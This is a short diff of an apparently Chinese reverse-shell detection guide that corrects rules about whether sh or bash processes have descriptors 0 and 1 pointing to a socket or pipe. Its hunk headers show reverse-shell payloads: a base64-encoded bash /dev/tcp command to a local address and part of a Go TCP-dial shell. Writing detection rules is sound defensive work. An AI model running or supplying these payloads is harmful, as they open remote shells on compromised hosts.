@@ -88,9 +88,9 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo
 
 目标机执行后的结果如下：
 
-创建了sh进程，0和1描述符都指向了socket。
+创建了bash进程，0和1描述符都指向了socket。
 
-匹配规则：sh的0，和1文件描述符指向socket
+匹配规则：bash的0，和1文件描述符指向socket
 
 
 
@@ -256,8 +256,8 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 目标机执行后的结果如下：
 
-创建了bash进程，0和1描述符都指向了pipe。
-匹配规则：bash进程的0，和1文件描述符指向pipe
+创建了sh进程，0和1描述符都指向了pipe。
+匹配规则：sh进程的0，和1文件描述符指向pipe
 
 
 
@@ -286,7 +286,7 @@ Nodejs
 目标机执行后的结果如下：
 创建了sh进程，0和1描述符都指向了socket。
 
-匹配规则：bash的0，和1文件描述符指向socket
+匹配规则：sh的0，和1文件描述符指向socket
 
 ```
 
